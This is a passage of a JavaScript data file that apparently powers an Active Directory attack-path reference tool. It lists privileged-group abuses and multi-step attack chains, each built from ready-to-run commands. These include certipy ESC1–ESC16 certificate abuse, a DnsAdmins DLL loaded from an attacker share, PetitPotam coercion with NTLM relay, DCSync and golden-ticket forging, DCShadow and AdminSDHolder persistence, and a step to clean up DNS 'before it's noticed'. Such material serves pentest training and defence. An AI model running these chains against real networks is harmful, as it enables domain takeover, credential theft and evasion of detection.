    grants: "The CA has the szOID_NTDS_CA_SECURITY_EXT extension globally disabled (via policy\\DisableExtensionList) or predates the May 2022 KB5014754 patch — so every certificate it issues lacks the SID-binding extension, making every one of its templates behave like ESC9, domain-wide, regardless of individual template hardening.",
    steps: [
      "certipy account -u $USER@$DOMAIN -p $PASS -dc-ip $DC -user 'victim' read",
      "certipy account -u $USER@$DOMAIN -p $PASS -dc-ip $DC -upn 'administrator' -user 'victim' update",
      "certipy shadow -u $USER@$DOMAIN -p $PASS -dc-ip $DC -account 'victim' auto",
      "certipy req -u 'victim@$DOMAIN' -hashes $HASH -ca 'CA-NAME' -template 'User' -upn 'administrator@$DOMAIN' -dc-ip $DC",
      "certipy account -u $USER@$DOMAIN -p $PASS -dc-ip $DC -upn 'victim@$DOMAIN' -user 'victim' update",
      "certipy auth -dc-ip $DC -pfx administrator.pfx -username administrator -domain $DOMAIN",
    ],
    impact: "A CA-wide disabling turns any single GenericWrite you hold over any account into domain-wide impersonation via UPN manipulation — no direct write access to the target needed at all. Only works under StrongCertificateBindingEnforcement 0/1 (compatibility mode); under full enforcement (2), ESC16 needs pairing with ESC6 to spoof the SID directly in the SAN instead.",
  },

  // ---------------- Privileged built-in groups ----------------

  {
    id: "MemberOf-DnsAdmins",
    name: "MemberOf: DnsAdmins",
    target: "DNS Server (usually a DC)",
    category: "local",
    grants: "DnsAdmins can configure the DNS Server service to load an arbitrary plugin DLL.",
    steps: [
      "dnscmd $DC /config /serverlevelplugindll \\\\$ATTACKER\\share\\evil.dll",
      "sc.exe \\\\$DC stop dns",
      "sc.exe \\\\$DC start dns",
    ],
    impact: "Code execution as SYSTEM on the DNS service — which usually means SYSTEM on a domain controller.",
  },
  {
    id: "MemberOf-BackupOperators",
    name: "MemberOf: Backup Operators",
    target: "Domain Controller",
    category: "local",
    grants: "SeBackupPrivilege and SeRestorePrivilege — the ability to read/write any file regardless of its ACL, via the backup API.",
    steps: [
      "diskshadow /s diskshadow_script.txt",
      "robocopy /b e:\\windows\\ntds\\ ntds_backup ntds.dit",
      "reg save HKLM\\SYSTEM C:\\Temp\\SYSTEM",
      "secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL",
    ],
    impact: "Full offline extraction of every domain password hash, entirely bypassing normal DCSync-style network access controls.",
  },
  {
    id: "MemberOf-AccountOperators",
    name: "MemberOf: Account Operators",
    target: "Domain",
    category: "local",
    grants: "Create, modify, and delete most user/group/computer objects domain-wide (protected/admin objects excluded).",
    steps: [
      "bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS add groupMember $TARGETOBJECT $USER",
      "# Account Operators can also create new computer accounts and reset passwords on non-protected users directly.",
    ],
    impact: "Broad object-creation and modification rights across the domain — frequently chains into further privesc via a freshly created or modified account.",
  },
  {
    id: "MemberOf-ServerOperators",
    name: "MemberOf: Server Operators",
    target: "Domain Controller",
    category: "local",
    grants: "Rights to log on locally to DCs and modify services running on them.",
    steps: [
      "sc.exe \\\\$DC config VULNSVC binpath= \"cmd /c net localgroup administrators $USER /add\"",
      "sc.exe \\\\$DC start VULNSVC",
    ],
    impact: "Reconfiguring any service on a DC to run an attacker-chosen command — direct path to SYSTEM on a domain controller.",
  },
  {
    id: "MemberOf-PrintOperators",
    name: "MemberOf: Print Operators",
    target: "Domain Controller",
    category: "local",
    grants: "Rights to log on locally to DCs and load printer drivers — kernel-mode code on the DC.",
    steps: [
      "# Load a malicious signed/self-signed printer driver via the print spooler's driver-installation API — the driver code runs in kernel mode.",
    ],
    impact: "Kernel-level code execution on a domain controller through what looks like a routine print-driver installation.",
  },
  {
    id: "MemberOf-ExchangeWindowsPermissions",
    name: "MemberOf: Exchange Windows Permissions",
    target: "Domain",
    category: "local",
    grants: "WriteDacl on the domain object — a long-standing default artifact of installing Exchange, held by the Exchange servers' own machine accounts (and this group).",
    steps: [
      "python3 privexchange.py -ah $ATTACKER $TARGET -u $USER -d $DOMAIN -p $PASS",
      "sudo ntlmrelayx.py -t ldap://$DC --escalate-user $USER",
    ],
    impact: "Grants the relayed/impersonated identity DCSync rights — full domain compromise from an Exchange server's mere presence.",
  },

];

// ============================================================
// ATTACK CHAINS — the individual EDGES above are single-hop
// primitives; a real BloodHound path is usually 3-6 of them linked
// together. Each chain is a tree of nodes (root = starting position,
// leaves = end state), rendered with real tree connectors. `edgeId`
// cross-links a node back to its full command writeup in EDGES.
// ============================================================
const CHAINS = [
  {
    id: "writespn-kerberoast",
    title: "WriteSPN → Kerberoast → Local Admin",
    category: "acl",
    summary:
      "Plant a Service Principal Name on an account you control write access to, then Kerberoast it like any other service account — turns a write primitive into an offline-crackable credential.",
    root: {
      label: "Low-priv domain user",
      children: [
        {
          label: "WriteSPN",
          edgeId: "WriteSPN",
          note: "right held over $TARGETOBJECT",
          children: [
            {
              label: "Plant an SPN",
              command: "bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS add spn --spn HTTP/fake $TARGETOBJECT",
              children: [
                {
                  label: "Kerberoast it",
                  command: "GetUserSPNs.py $DOMAIN/$USER:$PASS -request",
                  children: [
                    {
                      label: "Crack offline",
                      command: "hashcat -m 13100 hashes.txt rockyou.txt",
                      children: [{ label: "Target account's plaintext password" }],
                    },
                  ],
                },
              ],
            },
          ],
        },
      ],
    },
  },
  {
    id: "genericwrite-shadow-pkinit",
    title: "GenericWrite → Shadow Credentials → PKINIT → Takeover",
    category: "acl",
    summary:
      "GenericWrite (or the narrower AddKeyCredentialLink) lets you attach a certificate the account never asked for — PKINIT then treats that certificate as sufficient proof of identity.",
    root: {
      label: "GenericWrite / AddKeyCredentialLink",
      edgeId: "GenericWrite-User",
      note: "held over $TARGETOBJECT",
      children: [
        {
          label: "Shadow Credentials",
          command: "certipy shadow auto -u $USER@$DOMAIN -p $PASS -account $TARGETOBJECT -dc-ip $DC",
          children: [
            {
              label: "PKINIT authentication",
              note: "authenticate using the planted certificate — no password needed",
              children: [{ label: "NT hash + TGT for the target account", note: "full takeover" }],
            },
          ],
        },
      ],
    },
  },
  {
    id: "computer-acl-rbcd-s4u",
    title: "GenericAll on Computer → RBCD → S4U2Proxy → SYSTEM",
    category: "acl",
    summary:
      "Control over a computer object's msDS-AllowedToActOnBehalfOfOtherIdentity attribute lets you configure Resource-Based Constrained Delegation to yourself, then impersonate anyone through it.",
    root: {
      label: "GenericAll / GenericWrite on Computer",
      edgeId: "GenericAll-Computer",
      children: [
        {
          label: "Configure RBCD",
          command: "rbcd.py -delegate-to '$TARGETOBJECT$' -delegate-from 'ATTACKER$' -action write $DOMAIN/$USER:$PASS",
          children: [
            {
              label: "S4U2Self + S4U2Proxy",
              command: "getST.py -spn cifs/$TARGET $DOMAIN/'ATTACKER$':'Passw0rd!' -impersonate administrator",
              children: [{ label: "SYSTEM on the target computer", note: "pass the ticket, psexec.py" }],
            },
          ],
        },
      ],
    },
  },
  {
    id: "writedacl-addmember-da",
    title: "WriteDACL → AddMember → Domain Admins",
    category: "acl",
    summary:
      "WriteDACL doesn't grant membership by itself — it grants the right to grant yourself membership rights, which is the extra hop this chain makes explicit.",
    root: {
      label: "WriteDACL on Domain Admins",
      edgeId: "WriteDacl",
      note: "or an OU/container it inherits from",
      children: [
        {
          label: "Grant self WriteMembers",
          command: "dacledit.py -action write -rights WriteMembers -principal $USER $TARGETOBJECT",
          children: [
            {
              label: "AddMember",
              edgeId: "AddMember",
              command: "bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS add groupMember $TARGETOBJECT $USER",
              children: [{ label: "Domain Admin" }],
            },
          ],
        },
      ],
    },
  },
  {
    id: "writeowner-takeover",
    title: "WriteOwner → WriteDACL → (pick your primitive)",
    category: "acl",
    summary:
      "WriteOwner is a meta-primitive: it doesn't touch the object directly, it lets you become the owner — and an owner can always grant themselves WriteDACL, which unlocks every other ACL primitive on this list.",
    root: {
      label: "WriteOwner on target object",
      edgeId: "WriteOwner",
      children: [
        {
          label: "Take ownership",
          command: "owneredit.py -action write -owner $USER $TARGETOBJECT",
          children: [
            {
              label: "Grant self full control",
              command: "dacledit.py -action write -rights FullControl -principal $USER $TARGETOBJECT",
              children: [
                { label: "ForceChangePassword", note: "→ account takeover", edgeId: "ForceChangePassword" },
                { label: "AddMember", note: "→ privileged group, if target is a group", edgeId: "AddMember" },
              ],
            },
          ],
        },
      ],
    },
  },
  {
    id: "forcechangepassword-lateral",
    title: "ForceChangePassword → Takeover → Lateral Movement",
    category: "acl",
    summary:
      "Resetting a password doesn't need the old one — this is the fastest ACL primitive to weaponize, and it inherits whatever access the target account already had.",
    root: {
      label: "ForceChangePassword",
      edgeId: "ForceChangePassword",
      note: "held over $TARGETOBJECT — no existing password needed",
      children: [
        {
          label: "Reset the password",
          command: "net rpc password $TARGETOBJECT 'NewPassw0rd!' -U $DOMAIN/$USER%$PASS -S $DC",
          children: [
            {
              label: "Authenticate as the target",
              children: [
                { label: "CanRDP / AdminTo", note: "→ interactive access on whatever it admins" },
                { label: "Kerberoastable / DCSync rights", note: "→ inherited from the target, further escalation" },
              ],
            },
          ],
        },
      ],
    },
  },
  {
    id: "unconstrained-delegation",
    title: "Unconstrained Delegation Abuse",
    category: "deleg",
    summary:
      "A host trusted for unconstrained delegation caches a full TGT for anyone who authenticates to it — coerce a privileged account to connect, then just take its ticket.",
    root: {
      label: "Compromise a host with Unconstrained Delegation",
      note: "TRUSTED_FOR_DELEGATION on the computer's UAC flags",
      children: [
        {
          label: "Coerce authentication",
          note: "forces DC$ to connect back",
          command: "python3 PetitPotam.py -d $DOMAIN -u $USER -p $PASS $ATTACKER $DC",
          children: [
            {
              label: "TGT captured in LSASS",
              command: "Rubeus.exe monitor /interval:5 /filteruser:administrator",
              children: [
                {
                  label: "Pass-the-ticket as DC$",
                  children: [{ label: "DCSync using DC$'s TGT", note: "→ full domain compromise" }],
                },
              ],
            },
          ],
        },
      ],
    },
  },
  {
    id: "constrained-delegation-s4u",
    title: "Constrained Delegation → S4U2Self / S4U2Proxy",
    category: "deleg",
    summary:
      "msDS-AllowedToDelegateTo lets an account impersonate any user toward a specific service — S4U2Self manufactures the impersonation ticket, S4U2Proxy exchanges it for the real thing.",
    root: {
      label: "Compromise account with constrained delegation",
      edgeId: "AllowedToDelegate",
      note: "msDS-AllowedToDelegateTo set on the account",
      children: [
        {
          label: "S4U2Self",
          note: "impersonate any user to yourself — no interaction with that user needed",
          children: [
            {
              label: "S4U2Proxy",
              command: "getST.py $DOMAIN/$USER:$PASS -spn cifs/$TARGET -impersonate administrator",
              children: [{ label: "Access the allowed service as the impersonated user" }],
            },
          ],
        },
      ],
    },
  },
  {
    id: "gpo-abuse",
    title: "GPO Abuse → SYSTEM on Linked Computers",
    category: "gpo",
    summary:
      "Write access to a GPO is write access to every computer it's linked to — the policy just needs to apply once at the next gpupdate.",
    root: {
      label: "GenericWrite / WriteDACL on a GPO",
      edgeId: "GPLink",
      children: [
        {
          label: "Edit the GPO",
          command:
            "SharpGPOAbuse.exe --AddComputerTask --TaskName 'Update' --Author $DOMAIN\\$USER --Command cmd.exe --Arguments '/c net localgroup administrators $USER /add' --GPOName 'VulnGPO'",
          children: [
            {
              label: "Policy applies at next gpupdate",
              command: "gpupdate /force",
              note: "or wait for the refresh interval",
              children: [{ label: "SYSTEM / local admin on every linked computer" }],
            },
          ],
        },
      ],
    },
  },
  {
    id: "maq-rbcd",
    title: "MachineAccountQuota → New Computer → RBCD → SYSTEM",
    category: "deleg",
    summary:
      "The default MachineAccountQuota of 10 means any domain user can create a computer object outright — and an object you create, you control, which is enough to configure RBCD against a target.",
    root: {
      label: "Default MachineAccountQuota (10)",
      children: [
        {
          label: "Create a computer object",
          command: "addcomputer.py $DOMAIN/$USER:$PASS -computer-name 'ATTACKER$' -computer-pass 'Passw0rd!'",
          children: [
            {
              label: "Configure RBCD on a target",
              command: "rbcd.py -delegate-to '$TARGETOBJECT$' -delegate-from 'ATTACKER$' -action write $DOMAIN/$USER:$PASS",
              children: [
                {
                  label: "S4U2Proxy impersonating Administrator",
                  command: "getST.py -spn cifs/$TARGET $DOMAIN/'ATTACKER$':'Passw0rd!' -impersonate administrator",
                  children: [{ label: "SYSTEM on the target computer" }],
                },
              ],
            },
          ],
        },
      ],
    },
  },
  {
    id: "dcsync-golden-ticket",
    title: "DCSync → krbtgt → Golden Ticket → Domain Admin",
    category: "credread",
    summary:
      "DCSync rights read krbtgt's hash without ever touching a DC's disk; from there a Golden Ticket is forged entirely offline and lets you mint valid TGTs for any user, in any group, indefinitely.",
    root: {
      label: "GetChanges + GetChangesAll",
      edgeId: "DCSync",
      note: "held on the domain object",
      children: [
        {
          label: "DCSync",
          command: "secretsdump.py $DOMAIN/$USER:$PASS@$DC -just-dc-user krbtgt",
          children: [
            {
              label: "krbtgt NT hash",
              children: [
                {
                  label: "Forge a Golden Ticket",
                  command: "ticketer.py -nthash $HASH -domain-sid $SID -domain $DOMAIN Administrator",
                  children: [{ label: "Domain Admin, offline, until krbtgt is rotated twice" }],
                },
              ],
            },
          ],
        },
      ],
    },
  },

  // ---------------- Batch 2: coercion, ADCS, credential-dump, and Tier-0 chains ----------------
  {
    id: "coercion-relay-shadow-creds",
    title: "Coercion → NTLM Relay → LDAP → Shadow Credentials",
    category: "acl",
    summary:
      "Coerced authentication doesn't have to land in your listener as-is — relayed straight to LDAP, it can plant Shadow Credentials on the coerced computer instead of just passing the hash.",
    root: {
      label: "Coerce a machine account",
      note: "PrinterBug / PetitPotam / DFSCoerce",
      command: "python3 PetitPotam.py -d $DOMAIN -u $USER -p $PASS $ATTACKER $DC",
      children: [
        {
          label: "Relay to LDAP, add Shadow Credentials",
          command: "sudo ntlmrelayx.py -t ldap://$DC --shadow-credentials --shadow-target '$TARGETOBJECT$'",
          children: [
            {
              label: "Certificate added to msDS-KeyCredentialLink",
              children: [
                {
                  label: "PKINIT as the coerced computer",
                  command: "certipy auth -pfx $OUTFILE.pfx -dc-ip $DC",
                  children: [{ label: "Full control of the coerced machine account" }],
                },
              ],
            },
          ],
        },
      ],
    },
  },
  {
    id: "coercion-relay-rbcd",
    title: "Coercion → NTLM Relay → LDAP → RBCD",
    category: "acl",
    summary:
      "The RBCD variant of the same relay: instead of planting a certificate, the relayed LDAP write configures delegation, then S4U2Proxy does the impersonation.",
    root: {
      label: "Coerce a machine account",
      note: "PrinterBug / PetitPotam / DFSCoerce",
      command: "python3 dfscoerce.py -u $USER -p $PASS -d $DOMAIN $ATTACKER $DC",
      children: [
        {
          label: "Relay to LDAP, write RBCD",
          command: "sudo ntlmrelayx.py -t ldap://$DC --delegate-access",
          children: [
            {
              label: "msDS-AllowedToActOnBehalfOfOtherIdentity set to an attacker-controlled computer",
              children: [
                {
                  label: "S4U2Proxy impersonating Administrator",
                  command: "getST.py -spn cifs/$TARGET $DOMAIN/'ATTACKER$':'Passw0rd!' -impersonate administrator",
                  children: [{ label: "SYSTEM on the coerced computer" }],
                },
              ],
            },
          ],
        },
      ],
    },
  },
  {
    id: "coercion-relay-esc8",
    title: "Coercion → NTLM Relay → ADCS ESC8 → Domain Compromise",
    category: "adcs",
    summary:
      "Relayed straight to AD CS's HTTP enrollment endpoint instead of LDAP, coerced DC authentication becomes a certificate that authenticates as the DC itself.",
    root: {
      label: "Coerce the DC to authenticate",
      command: "python3 PetitPotam.py -d $DOMAIN -u $USER -p $PASS $ATTACKER $DC",
      children: [
        {
          label: "Relay to AD CS web enrollment (ESC8)",
          command: "sudo ntlmrelayx.py --adcs --template DomainController -t http://$DC/certsrv/certfnsh.asp -smb2support",
          children: [
            {
              label: "Certificate issued for the DC's own machine identity",
              children: [
                {
                  label: "PKINIT as the DC",
                  command: "certipy auth -pfx $OUTFILE.pfx -dc-ip $DC",
                  children: [{ label: "DCSync using the DC's own identity", note: "→ full domain compromise" }],
                },
              ],
            },
          ],
        },
      ],
    },
  },
  {
    id: "esc4-esc1-pkinit",
    title: "ADCS ESC4 → ESC1 → PKINIT → Domain Admin",
    category: "adcs",
    summary:
      "ESC4 (write access to a template) isn't exploitable by itself — it's exploitable because it lets you reconfigure the template into an ESC1-vulnerable one, then run the ESC1 chain against your own edit.",
    root: {
      label: "WriteOwner / WriteDacl / GenericWrite on a certificate template",
      edgeId: "ADCSESC4",
      children: [
        {
          label: "Reconfigure the template (ESC4)",
          command: "certipy template -u $USER@$DOMAIN -p $PASS -template 'VulnTemplate' -save-old",
          children: [
            {
              label: "Template is now ESC1-exploitable",
              children: [
                {
                  label: "Request a cert as any user (ESC1)",
                  command: "certipy req -u $USER@$DOMAIN -p $PASS -dc-ip $DC -ca 'CA-NAME' -template 'VulnTemplate' -upn administrator@$DOMAIN",
                  children: [
                    {
                      label: "PKINIT as Administrator",
                      command: "certipy auth -pfx $OUTFILE.pfx -dc-ip $DC",
                      children: [{ label: "Domain Admin" }],
                    },
                  ],
                },
              ],
            },
          ],
        },
      ],
    },
  },
  {
    id: "gpp-sysvol-lateral",
    title: "SYSVOL/NETLOGON → GPP cpassword → Lateral Movement",
    category: "credread",
    summary:
      "SYSVOL is readable by every authenticated domain user by default — a Group Policy Preferences item left over from before MS14-025 hands out an AES-decryptable local admin password.",
    root: {
      label: "Read access to SYSVOL",
      note: "default for every domain user",
      children: [
        {
          label: "Find a leftover Groups.xml with a cpassword",
          note: "search \\\\$DC\\SYSVOL\\...\\Policies\\...\\Groups\\Groups.xml",
          children: [
            {
              label: "Decrypt the cpassword",
              note: "Microsoft's AES key for GPP is public",
              command: "gpp-decrypt $HASH",
              children: [
                {
                  label: "Local admin password, deployed via GPP",
                  children: [{ label: "Lateral movement to every host that GPP pushed it to" }],
                },
              ],
            },
          ],
        },
      ],
    },
  },
  {
    id: "laps-lateral",
    title: "LAPS Read → Local Admin → Lateral Movement",
    category: "credread",
    summary:
      "LAPS rotates local admin passwords per-computer specifically to stop this kind of chain from going anywhere — but read rights on the password attribute still hand you that one computer.",
    root: {
      label: "ReadLAPSPassword / All Extended Rights",
      edgeId: "ReadLAPSPassword",
      note: "held on a LAPS-managed computer",
      children: [
        {
          label: "Read the LAPS password",
          command: "Get-LapsADPassword $TARGETOBJECT -AsPlainText",
          children: [
            {
              label: "Local admin credential for that specific computer",
              children: [
                {
                  label: "CanRDP / AdminTo / PSRemote on that host",
                  note: "LAPS passwords are unique per computer — this doesn't chain further without another primitive",
                },
              ],
            },
          ],
        },
      ],
    },
  },
  {
    id: "ntds-reuse-lateral",
    title: "NTDS.dit → Password Reuse → Lateral Movement",
    category: "credread",
    summary:
      "A full NTDS dump gives every account hash in the domain at once — cracking the weak ones and checking for reuse turns one DCSync into admin on hosts that have nothing to do with the original target.",
    root: {
      label: "DCSync rights, or offline NTDS.dit + SYSTEM hive access",
      children: [
        {
          label: "Full NTDS dump",
          command: "secretsdump.py $DOMAIN/$USER:$PASS@$DC -just-dc",
          children: [
            {
              label: "Crack weak/reused hashes offline",
              command: "hashcat -m 1000 ntds.txt rockyou.txt",
              children: [
                {
                  label: "Password reused as local admin elsewhere",
                  note: "shared local admin, forgotten service accounts",
                  children: [{ label: "Lateral movement across every host sharing that password" }],
                },
              ],
            },
          ],
        },
      ],
    },
  },
  {
    id: "trust-abuse",
    title: "Trust Abuse — Cross-Domain / Cross-Forest Escalation",
    category: "gpo",
    summary:
      "A trust relationship is itself an edge — with SID filtering disabled (routine on parent/child, rare but real cross-forest), a ticket forged in the trusted domain carries privilege into the trusting one.",
    root: {
      label: "TrustedBy",
      edgeId: "TrustedBy",
      note: "another domain/forest trusts this one",
      children: [
        {
          label: "Check SID filtering status",
          note: "this chain requires SID filtering disabled to cross the trust boundary",
          children: [
            {
              label: "Forge an inter-realm TGT carrying a privileged SID",
              command: "ticketer.py -nthash $HASH -domain-sid $SID -domain $DOMAIN -extra-sid $SID-519 -sid $SID administrator",
              children: [{ label: "Domain Admin in the trusting domain/forest" }],
            },
          ],
        },
      ],
    },
  },
  {
    id: "sidhistory-abuse",
    title: "SIDHistory Abuse",
    category: "deleg",
    summary:
      "sIDHistory exists for legitimate account migration — a forged ticket carrying a privileged historical SID inherits that SID's rights the instant it's presented, no membership check involved.",
    root: {
      label: "Write access to sIDHistory, or a domain with SID filtering disabled",
      edgeId: "HasSIDHistory",
      children: [
        {
          label: "Forge a ticket carrying a privileged historical SID",
          command: "ticketer.py -nthash $HASH -domain-sid $SID -domain $DOMAIN -extra-sid $SID-519 administrator",
          children: [
            {
              label: "Rights of the historical SID apply on presentation",
              children: [{ label: "Domain Admin, if the forged SID belonged to that group" }],
            },
          ],
        },
      ],
    },
  },
  {
    id: "adminsdholder-persistence",
    title: "AdminSDHolder Abuse (Persistence)",
    category: "acl",
    summary:
      "SDProp copies AdminSDHolder's ACL onto every protected group member on a recurring cycle — plant an ACE there once and it keeps re-applying itself, surviving individual password resets.",
    root: {
      label: "Temporary WriteDACL on AdminSDHolder",
      note: "e.g. from the WriteOwner chain above, used once",
      children: [
        {
          label: "Grant a controlled principal full rights",
          command: "Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=corp,DC=local' -PrincipalIdentity $USER -Rights All",
          children: [
            {
              label: "SDProp propagates the ACE to every protected group member",
              note: "runs on a roughly 60-minute cycle from the PDC emulator",
              children: [{ label: "Persistent control over Domain Admins and every other Tier-0 group" }],
            },
          ],
        },
      ],
    },
  },
  {
    id: "dcshadow-persistence",
    title: "DCShadow — Rogue Replication Partner",
    category: "acl",
    summary:
      "Registering as a fake domain controller lets you push an attribute change directly into AD's replication stream — it lands on every real DC without ever generating the object-modification events they'd normally log.",
    root: {
      label: "DA-equivalent rights, at least once",
      children: [
        {
          label: "Register as a rogue replication partner and push a change",
          command: "lsadump::dcshadow /object:$TARGETOBJECT /attribute:primaryGroupID /value:512",
          children: [
            {
              label: "Change replicates to every real DC",
              note: "bypasses 4662/5136 — no object-modification event on the real DCs",
              children: [{ label: "Persists across krbtgt rotation and DA password resets" }],
            },
          ],
        },
      ],
    },
  },
  {
    id: "dns-abuse",
    title: "AD-Integrated DNS Abuse",
    category: "acl",
    summary:
      "Every authenticated user can create DNS records in an AD-integrated zone by default — a wildcard record turns every unresolved lookup on the network into a rendezvous with attacker infrastructure.",
    root: {
      label: "WriteDacl / DnsAdmins membership on the zone",
      note: "or the default authenticated-user record-creation right",
      children: [
        {
          label: "Plant a wildcard record",
          command: "dnstool.py -u $DOMAIN\\$USER -p $PASS --action add --record '*' --data $ATTACKER --type A $DC",
          children: [
            {
              label: "Unresolved lookups redirect to attacker infrastructure",
              note: "useful rendezvous point for coercion/relay setups",
              children: [
                {
                  label: "Clean up before it's noticed",
                  command: "dnstool.py -u $DOMAIN\\$USER -p $PASS --action remove --record '*' --type A $DC",
                },
              ],
            },
          ],
        },
      ],
    },
  },

  // ---------------- CVE chains — the same CVEs tracked in the CVEs tab, graphed end to end ----------------
  {
    id: "cve-certifried-chain",
    title: "CVE-2022-26923 (Certifried) — Full Chain",
    category: "adcs",
    summary:
      "The historically real version of the ESC8-style DC-impersonation chain: a standard domain user, no coercion or relay needed, just an unvalidated attribute write plus AD CS's default trust in machine identity.",
    root: {
      label: "Domain user",
      note: "default MachineAccountQuota",
      children: [
        {
          label: "Create a computer account",
          command: "addcomputer.py -computer-name 'FAKE01$' -computer-pass 'Passw0rd!' $DOMAIN/$USER:$PASS",
          children: [
            {
              label: "Rewrite dNSHostName to match a real DC",
              command: "certipy account update -u $USER@$DOMAIN -p $PASS -user 'FAKE01$' -dns $DC",
              children: [
                {
                  label: "Request a Machine-template cert as the spoofed identity",
                  command: "certipy req -u 'FAKE01$'@$DOMAIN -p 'Passw0rd!' -ca 'CA-NAME' -template Machine -dns $DC",
                  children: [
                    {
                      label: "Certificate authenticates as the real DC",
                      children: [{ label: "DCSync using the DC's own identity", note: "→ full domain compromise" }],
                    },
                  ],
                },
              ],
            },
          ],
        },
      ],
    },
  },
  {
    id: "cve-25177-chain",
    title: "CVE-2026-25177 (SPN/UPN Collision) — Full Chain",
    category: "deleg",
    summary:
      "Connects directly to WriteSPN: the same write access that enables Kerberoasting can, per independent research, also plant Unicode confusables that survive AD's forest-wide uniqueness check.",
    root: {
      label: "WriteSPN / self-service SPN or UPN write",
      edgeId: "WriteSPN",
      note: "held on a low-priv account",
      children: [
        {
          label: "Inject Unicode confusables into the SPN/UPN value",
          note: "zero-width spaces, homoglyphs, BOM markers",
          children: [
            {
              label: "Forest-wide SPN/UPN uniqueness check bypassed",
              children: [
                {
                  label: "Kerberos ticket mis-issuance / identity confusion with the collided principal",
                  note: "root cause per independent research, not vendor-confirmed — treat as high-severity pending Microsoft's own writeup",
                  children: [{ label: "Privileged identity confusion", note: "→ privilege escalation" }],
                },
              ],
            },
          ],
        },
      ],
    },
  },

  // ---------------- Batch 3: ADCS ESC2/3/6/7/9/10/11, and the hybrid/cloud identity graph ----------------
  {
    id: "esc3-enrollment-agent",
    title: "ADCS ESC3 — Enrollment Agent → Mint a Cert for Anyone",
    category: "adcs",
    summary:
      "A template with the Certificate Request Agent EKU lets its holder request certificates on behalf of other users entirely — the agent never has to touch the target's account at all.",
    root: {
      label: "Enroll in a template with the Certificate Request Agent EKU",
      edgeId: "ADCSESC3",
      children: [
        {
          label: "Get an agent certificate",
          command: "certipy req -u $USER@$DOMAIN -p $PASS -ca 'CA-NAME' -template 'EnrollmentAgent'",
          children: [
            {
              label: "Request a cert on behalf of Administrator",
              command: "certipy req -u $USER@$DOMAIN -p $PASS -ca 'CA-NAME' -template 'User' -on-behalf-of '$DOMAIN\\administrator' -pfx agent.pfx",
              children: [
                {
                  label: "PKINIT as Administrator",
                  command: "certipy auth -pfx $OUTFILE.pfx -dc-ip $DC",
                  children: [{ label: "Domain Admin", note: "without ever touching the target account" }],
                },
              ],
            },
          ],
        },
      ],
    },
  },
  {
    id: "esc6-editf-san",
    title: "ADCS ESC6 — CA-Wide SAN Injection → Domain-Wide ESC1",
    category: "adcs",
    summary:
      "The EDITF_ATTRIBUTESUBJECTALTNAME2 flag lets any requester specify a Subject Alternative Name at request time — a CA-level misconfiguration that turns every enrollable template into ESC1 at once.",
    root: {
      label: "CA has EDITF_ATTRIBUTESUBJECTALTNAME2 set",
      edgeId: "ADCSESC6",
      children: [
        {
          label: "Request any enrollable template with an attacker-chosen SAN",
          command: "certipy req -u $USER@$DOMAIN -p $PASS -ca 'CA-NAME' -template 'User' -upn administrator@$DOMAIN",
          children: [
            {
              label: "PKINIT as Administrator",
              command: "certipy auth -pfx $OUTFILE.pfx -dc-ip $DC",
              children: [{ label: "Domain Admin", note: "from a template that was never meant to allow this" }],
            },
          ],
        },
      ],
    },
  },
  {
    id: "esc7-manage-ca",
    title: "ADCS ESC7 — Manage CA Rights → Enable a Vulnerable Template",
    category: "adcs",
    summary:
      "Manage CA / Manage Certificates rights on the CA object don't touch any template directly — but they let you re-enable a dangerous one (like SubCA) that was disabled specifically to prevent this.",
    root: {
      label: "Manage CA / Manage Certificates rights on the CA object",
      edgeId: "ADCSESC7",
      children: [
        {
          label: "Re-enable the SubCA template",
          command: "certipy ca -u $USER@$DOMAIN -p $PASS -ca 'CA-NAME' -enable-template 'SubCA'",
          children: [
            {
              label: "Request a cert as Administrator from it",
              command: "certipy req -u $USER@$DOMAIN -p $PASS -ca 'CA-NAME' -template 'SubCA' -upn administrator@$DOMAIN",
              children: [{ label: "Domain Admin" }],
            },
          ],
        },
      ],
    },
  },
  {
    id: "esc9-10-weak-mapping",
    title: "ADCS ESC9 / ESC10 — Weak Cert Mapping + UPN Write → Takeover",
    category: "adcs",
    summary:
      "Neither a security-extension-disabled template (ESC9) nor a DC in weak certificate-mapping mode (ESC10) is exploitable alone — both need a second, ordinary primitive: write access to the victim's userPrincipalName.",
    root: {
      label: "Write access to a victim's userPrincipalName",
      note: "plus a no-security-extension template (ESC9) or weak StrongCertificateBindingEnforcement (ESC10)",
      children: [
        {
          label: "Temporarily set the victim's UPN to Administrator's",
          command: "certipy account update -u $USER@$DOMAIN -p $PASS -user $TARGETOBJECT -upn administrator",
          children: [
            {
              label: "Request a certificate as the victim",
              command: "certipy req -u $TARGETOBJECT@$DOMAIN -p $PASS -ca 'CA-NAME' -template 'User'",
              children: [
                {
                  label: "Restore the victim's real UPN",
                  command: "certipy account update -u $USER@$DOMAIN -p $PASS -user $TARGETOBJECT -upn $TARGETOBJECT",
                  children: [
                    {
                      label: "PKINIT with the certificate",
                      command: "certipy auth -pfx $OUTFILE.pfx -domain $DOMAIN",
                      note: "the cert still carries the Administrator UPN it was issued with",
                      children: [{ label: "Authenticates as Administrator" }],
                    },
                  ],
                },
              ],
            },
          ],
        },
      ],
    },
  },
  {
    id: "esc11-rpc-relay",
    title: "ADCS ESC11 — RPC Enrollment Relay → Domain Compromise",
    category: "adcs",
    summary:
      "The ESC8 relay chain assumes HTTP web enrollment — ESC11 is the same idea over the CA's RPC (ICPR) interface, which skips Extended Protection entirely and stays exploitable even when the HTTP endpoint is hardened.",
    root: {
      label: "Coerce the DC to authenticate",
      command: "python3 PetitPotam.py -d $DOMAIN -u $USER -p $PASS $ATTACKER $DC",
      children: [
        {
          label: "Relay over RPC to the CA's enrollment interface",
          edgeId: "ADCSESC11",
          command: "certipy relay -target 'rpc://$DC' -ca 'CA-NAME'",
          children: [{ label: "Certificate for the DC's machine identity", note: "→ same payoff as ESC8: full domain compromise" }],
        },
      ],
    },
  },
  {
    id: "aadconnect-onprem-compromise",
    title: "AAD Connect Server → Sync Account → On-Prem Domain Compromise",
    category: "credread",
    summary:
      "The AAD Connect / Entra Connect sync account holds Replicating Directory Changes rights on-prem by default — local admin on the sync server itself is effectively DCSync rights on the whole domain.",
    root: {
      label: "Local admin on the AAD Connect / Entra Connect server",
      children: [
        {
          label: "Extract the sync account's credentials",
          command: "Get-AADIntSyncCredentials",
          children: [
